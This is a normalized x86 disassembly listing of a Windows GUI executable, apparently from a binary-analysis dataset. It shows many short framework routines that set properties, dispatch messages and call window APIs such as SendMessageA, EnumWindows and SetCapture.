sub_43769e
jmp sub_4039a0
j_sub_437695
jmp sub_437695
sub_4376a5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437850
push ebx
mov ebx eax
mov eax ebx
call sub_43ffd0
mov eax ebx
call sub_441900
pop ebx
retn
sub_437864
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_437870
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44414c
sub_437884
test dl dl
je r-xdata
xor edx edx
call sub_437898
retn
mov dl 0x1
call sub_437898
retn
sub_437974
push ebx
mov ebx eax
mov eax ebx
call sub_445198
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_437988
call sub_44414c
retn
sub_437a1e
jmp sub_4039a0
sub_437a25
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437a2c
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_437a9c
mov al [ eax + 0x211 ]
retn
sub_437ad0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44414c
sub_437ad5
add [ ebx + ecx - 0x78 ] dh
nop
adc [ edx ] al
add [ eax ] al
call sub_44414c
retn
sub_437cb0
call sub_44414c
retn
sub_437d2d
jmp sub_4039a0
sub_437d34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437d5e
retn
sub_437d6c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_437e4c
jmp sub_4039a0
sub_437e53
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437edf
jmp sub_4039a0
sub_437ee6
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438025
jmp sub_4039a0
sub_43802c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4380c1
jmp sub_4039a0
sub_4380c8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4380d0
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403448
pop esi
retn
sub_43820e
jmp sub_4039a0
sub_438230
jmp sub_4039a0
sub_438237
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438240
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403448
pop esi
retn
sub_4383aa
jmp sub_4039a0
sub_4383c7
jmp sub_4039a0
sub_4383ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43857f
jmp sub_4039a0
sub_438586
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4385d4
push esi
mov si 0xffb1
call sub_403448
pop esi
retn
sub_4385e0
push esi
mov si 0xffb0
call sub_403448
pop esi
retn
sub_43863a
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_43879f
jmp sub_4039a0
sub_4387a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4388f0
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_438914
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_4389e8
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_44414c
sub_438a00
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_44414c
sub_438a1c
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_44414c
sub_438b30
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_44414c
sub_438b90
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_438c54
jmp sub_4039a0
sub_438c5b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438cf6
jmp sub_4039a0
sub_438cfd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438d04
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_44414c
sub_438d83
push ecx
or [ esi + 0x5b ] bl
retn
sub_4393a4
push ebx
mov ebx eax
mov eax ebx
call sub_445198
mov eax ebx
call sub_43881c
pop ebx
retn
sub_439524
jmp sub_4039a0
sub_43952b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_439534
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_439948
jmp sub_4039a0
sub_43994f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439a2c
jmp sub_4039a0
sub_439a33
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439a3c
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_439c1c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_439c25
jmp sub_4039a0
j_sub_439c1c
jmp sub_439c1c
sub_439c2c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439c34
push ebx
mov ebx eax
mov eax ebx
call sub_446108
mov eax ebx
call sub_439c78
pop ebx
retn
sub_439c48
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_439c78
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_439c64
push ebx
mov ebx eax
mov eax ebx
call sub_442480
mov eax ebx
call sub_439c78
pop ebx
retn
sub_439d50
jmp sub_4039a0
sub_439d57
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439d90
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_44414c
sub_439da4
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
test dl dl
je r-xdata
call sub_439c78
sub_439dbc
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_44414c
sub_439dd0
mov [ eax + 0x20c ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41fca8
sub_439de4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44414c
sub_439e9c
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_439ecd
jmp sub_4039a0
sub_439ed4
pop ebp
retn
sub_439ed8
sub [ rw-data ] 0x1
retn
sub_43a035
jmp sub_4039a0
sub_43a03c
pop ebp
retn
sub_43a040
sub [ rw-data ] 0x1
retn
sub_43a059
add eax 0xffffffe0
jmp sub_43a640
sub_43a061
add eax 0xffffffe0
jmp sub_43a6a8
sub_43a069
add eax 0xffffffe0
jmp sub_43a7bc
sub_43a071
add eax 0xffffffe0
jmp sub_43a830
sub_43a079
add eax 0xffffffe0
jmp sub_43a2ec
sub_43a081
add eax 0xffffffe0
jmp sub_43a300
sub_43a089
add eax 0xffffffe0
jmp sub_43a378
sub_43a091
add eax 0xffffffe0
jmp sub_43a41c
sub_43a099
add eax 0xffffffe0
jmp sub_43a420
sub_43a0a1
add eax 0xffffffe0
jmp sub_43a4a8
sub_43a0a9
add eax 0xffffffe0
jmp sub_43a5f0
sub_43a0b1
add eax 0xffffffe0
jmp sub_43a5f4
sub_43a0b9
add eax 0xffffffe0
jmp sub_43a610
sub_43a0c1
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a78
sub_43a0cb
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405aa0
sub_43a2a9
jmp sub_4039a0
sub_43a2b0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a2ec
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403ff0
pop ebx
retn
sub_43a2fe
mov eax eax
sub_43a367
jmp sub_4039a0
sub_43a36e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a400
jmp sub_4039a0
sub_43a407
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a41c
mov al 0x1
retn
sub_43a49b
jmp sub_4039a0
sub_43a4a2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a5a0
jmp sub_4039a0
sub_43a5a7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a5f0
mov [ eax + 0xc ] edx
retn
sub_43a5f4
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43a698
jmp sub_4039a0
sub_43a69f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a79e
jmp sub_4039a0
sub_43a7a5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a81e
jmp sub_4039a0
sub_43a825
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a82e
mov eax eax
sub_43a8b0
jmp sub_4039a0
sub_43a8b7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a9ab
jmp sub_4039a0
sub_43a9b2
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43aa74
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43a9c0
call EnumWindows
retn
sub_43ab06
jmp sub_4039a0
sub_43ab0d
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43ab18
xor eax eax
retn
sub_43ac11
jmp sub_4039a0
sub_43ac18
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ad02
jmp sub_4039a0
sub_43ad09
pop ebp
retn
sub_43ad5e
jmp sub_4039a0
sub_43ad65
pop ebp
retn
sub_43c358
pop esp
retn
sub_43c9a0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
0x43
sub_43c9ac
lodsb [ esi ]
0x43
sub_43ccbd
add eax 0xffffff8c
jmp sub_44922c
sub_43ccc5
add eax 0xffffff8c
jmp sub_449230
sub_43cccd
add eax 0xffffff8c
jmp sub_44931c
sub_43ccd5
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43cce2
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43ccef
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43ccfc
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43cd09
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43cd16
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43cd23
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43cd30
add eax 0xffffff8c
jmp sub_44a98c
sub_43cd38
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405a78
sub_43cd42
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405aa0
sub_43cd58
cmp ch cl
inc ebx
add [ edx - 0x33 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ ebp - 0x3affbc34 ] bh
int3
sub_43ce9a
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
iretd
sub_43d1a4
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43d4b7
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_419ce8
retn
sub_43d4d4
push 0x15
mov ecx rw-data
call sub_419ca8
retn
sub_43d56c
call GetCapture
call sub_43d2a4
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43d7d0
push ebx
push eax
push sub_43d954
call sub_420d24
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43d7e8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43d818
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_420dd8
pop ebx
retn
sub_43d8f6
jmp sub_4036ec
sub_43d928
xor eax eax
retn
sub_43d92c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43d944
retn
sub_43d948
mov eax [ rw-data ]
retn
sub_43d950
retn
sub_43d97e
jmp sub_4036ec
sub_43d983
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d9a0
call sub_4034a4
xor eax eax
mov [ rw-data ] eax
retn
sub_43d9b0
call sub_4034a0
xor eax eax
mov [ rw-data ] eax
retn
sub_43d9c0
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403570
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43da6e
mov eax eax
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43da88
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43dad4
retn
sub_43dc8c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403448
pop esi
retn
sub_43dca0
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403448
pop esi
retn
sub_43dcb4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43dcc0
mov eax 0x4
retn
sub_43dcc8
retn
sub_43e8b9
jmp sub_4036ec
sub_43eba6
jmp sub_4039a0
sub_43ec18
jmp sub_4039a0
sub_43ec24
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43e94c
sub_43eda3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_423d60
retn
sub_43edb9
jmp sub_4039a0
sub_43ede0
jmp sub_4039a0
sub_43ee62
jmp sub_4039a0
sub_43ee8a
jmp sub_4039a0
sub_43ee91
mov esp ebp
pop ebp
retn
sub_43ef49
jmp sub_4039a0
sub_43efa0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43ef6c
mov [ ebx + 0x58 ] esi
sub_43f0f4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43f108
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43f1f1
jmp sub_4039a0
sub_43f1f8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f27b
jmp sub_4039a0
sub_43f282
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43f650
xor eax eax
retn
sub_43f654
mov al [ eax + 0x58 ]
retn
sub_43f658
xor eax eax
retn
sub_43f65c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43f664
mov eax [ eax + 0x30 ]
retn
sub_43f708
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43f7b4
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43f7cc
mov [ eax + 0x5d ] dl
retn
sub_43f7d0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4433b0
sub_43f7e0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43fcc3
jmp sub_4039a0
sub_43fcca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fd2c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43fdb0
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43fecd
jmp sub_4039a0
sub_43fed4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ffd0
push eax
xor ecx ecx
mov edx 0xb037
call sub_441578
retn
sub_440191
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403448
sub_440242
jmp sub_4039a0
sub_440249
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440320
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_441578
sub_440338
push 0x0
xor ecx ecx
mov edx 0xe
call sub_441578
retn
sub_440348
push edx
mov edx 0xd
call sub_441578
retn
sub_440354
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_440368
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_440449
jmp sub_4039a0
sub_440450
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440458
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_441578
sub_4404c8
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_4404dc
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_4404e8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_4404f0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_441578
sub_440514
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_441578
sub_440538
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_441578
sub_440580
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_440588
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_441578
sub_4405ac
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_441578
sub_4405d0
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_441578
sub_4405ec
push ebx
mov ebx eax
call sub_43d56c
cmp ebx eax
sete al
pop ebx
retn
sub_440624
push esi
mov dl 0x1
mov si 0xffce
call sub_403448
pop esi
retn
sub_44076e
jmp sub_4039a0
sub_440775
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440898
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44080c
retn
sub_4408ec
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_440900
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4409e5
jmp sub_4039a0
sub_440a04
xor eax eax
retn
sub_440a08
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_440a20
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_440a38
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_440a54
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_440a6c
retn
sub_440b30
retn
sub_440b34
cmp eax [ rw-data ]
sete al
retn
sub_440ba8
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_440cc4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403448
pop esi
pop ebp
retn 0x4
sub_440d04
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_440f9b
jmp sub_4039a0
sub_440fa2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440fac
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403448
pop esi
retn
sub_440fc0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403448
pop esi
retn
sub_44128f
jmp sub_4039a0
sub_441338
push esi
mov si 0xffee
call sub_403448
pop esi
retn
sub_441344
mov al 0x1
retn
sub_44161c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43fa18
retn
sub_441640
retn
sub_441859
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d4f4
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_441874
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41f82c
retn
sub_44196c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_441f84
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_441f8c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_441f94
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44204c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44206c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_440514
mov [ ebx + 0x9a ] 0x1
sub_4420c4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_4404b8
mov [ ebx + 0x56 ] 0x1
sub_4420e8
mov [ edx + 0xc ] 0x1
retn
sub_4420f0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_441578
sub_442108
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_441578
sub_442120
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_442386
jmp sub_4039a0
sub_44238d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4423b8
mov eax [ r-xdata ]
retn
sub_442554
jmp sub_4039a0
sub_44255b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44267c
mov eax [ eax + 0xb8 ]
retn
sub_4426e4
push ebx
mov ebx eax
mov eax ebx
call sub_440a08
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_442700
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_442898
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4428c8
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_4428d0
call sub_43f484
retn
sub_4429d0
jmp sub_4039a0
sub_442b90
jmp sub_4039a0
sub_442be0
jmp sub_4039a0
sub_442c18
retn
sub_442ea1
jmp sub_4039a0
sub_443029
jmp sub_4039a0
sub_44338b
jmp sub_4039a0
sub_443437
jmp sub_4039a0
sub_443444
inc [ eax + 0x160 ]
retn
sub_44344c
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44346c
sub_44346c
xor edx edx
call sub_4433b0
retn
sub_443539
jmp sub_4039a0
sub_443540
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44362f
jmp sub_4039a0
sub_443b56
jmp sub_4039a0
sub_443b5d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443d25
jmp sub_4039a0
sub_443d2c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443e00
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_443fed
jmp sub_4039a0
sub_443ff4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4440e4
xor eax eax
retn
sub_44414c
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_441578
sub_44427a
jmp sub_4036ec
sub_4443af
jmp sub_4039a0
sub_4443b6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4443c0
jmp sub_4036ec
sub_4443c5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444980
jmp sub_4039a0
sub_444987
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444990
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_444e8e
jmp sub_4039a0
sub_444ee0
push ebx
mov ebx eax
call sub_4225a8
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_441578
pop ebx
retn
sub_444efc
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_441578
retn
sub_444f10
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_441578
retn
sub_444f20
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_441578
